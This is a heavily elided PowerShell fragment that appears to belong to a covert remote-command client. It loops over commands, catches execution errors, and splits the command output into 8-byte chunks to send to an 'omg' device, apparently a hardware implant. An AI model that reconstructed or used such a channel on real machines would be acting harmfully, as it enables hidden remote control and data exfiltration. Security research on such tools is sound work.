    ...
    while ($loop) {
        try {
                ...
                Try {
                    ...
                    $output = "PS EXEC Error"
                    Write-Host -ForegroundColor red "[!]Error: Unable to run command"
                }
                #Convert output to bytes
                $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
                $outputLength = $outputBytes.Length
                #Send output bytes to omg
                $outputChunkSize = 8 # Kept small for best experience
                ...
                for ($i = 0; $i -lt $outputChunkNr; $i++) {
                    ...
                    [System.Buffer]::BlockCopy($outputBytes, $outputStart, $outputBytesToSend, 0, $outputChunkLen) # Copy the chunk to the packet
                    if ($VerbosePreference -eq 'Continue') {
